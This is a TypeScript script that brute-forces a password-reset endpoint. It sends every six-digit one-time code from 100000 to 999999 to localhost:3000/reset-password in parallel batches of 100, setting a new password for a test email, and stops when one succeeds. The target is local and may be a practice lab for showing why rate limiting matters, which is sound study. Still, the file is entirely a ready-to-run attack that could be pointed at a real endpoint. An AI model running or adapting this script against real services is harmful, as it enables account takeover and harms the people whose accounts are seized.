import axios from 'axios';

interface BrutForceProps {
    otp: string
}

const brutForce = async ({ otp }: BrutForceProps) => {
    try {
        let data = JSON.stringify({
            "email": "test@gmail.com",
            "otp": otp,
            "newPassword": "newPassword"
          });
          
          let config = {
            method: 'post',
            maxBodyLength: Infinity,
            url: 'http://localhost:3000/reset-password',
            headers: { 
              'Content-Type': 'application/json'
            },
            data : data
          };
          
         const response = await axios.request(config)
         if (response.data.success) {
            return true;
        }
        return false;
    } catch (error) {
        return false;
    }
};

const attemptBruteForce = async () => {
    for (let i = 100000; i < 1000000; i++) {
        let p = []
        for(let j = 0; j < 100; j++) {
            const otp = (i+j).toString();
            console.log("otp", otp);
            const result = brutForce({
                otp,
            });
            p.push(result);
        }
        const results = await Promise.all(p);
        console.log("waited for 100 requests");
        if (results.includes(true)) {
            console.log("Successful OTP found, stopping brute force");
            break;
        }
    }
};

attemptBruteForce();
